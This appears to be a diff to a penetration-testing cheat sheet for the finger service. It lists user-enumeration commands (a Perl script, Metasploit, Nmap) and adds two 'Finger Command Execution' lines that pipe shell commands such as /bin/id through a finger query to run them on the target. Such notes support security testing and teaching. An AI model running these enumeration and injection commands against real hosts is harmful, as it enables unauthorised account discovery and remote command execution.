@@ -9,8 +9,8 @@
 ./finger-user-enum.pl -U users.txt -t <IP> | less -S
 
 # Gather information about user at specific IP address
+finger @<IP>
 finger <username>@<IP>
-;; or
 finger root <IP>
 
 # Gather information from metasploit 'finger_users'
@@ -21,6 +21,10 @@ msfconsole > services -p 79 -u -R
 # Nmap finger script
 ;; finger.nse : Attempts to retrieve a list of usernames using the finger service
 nmap --script=finger <target_IP>
+
+# Finger Command Execution
+finger "|/bin/id@<IP>"
+finger "|/bin/ls -a /<IP>"
 
 # OffTopic (get wather for your city)
 finger newdelhi@graph.no
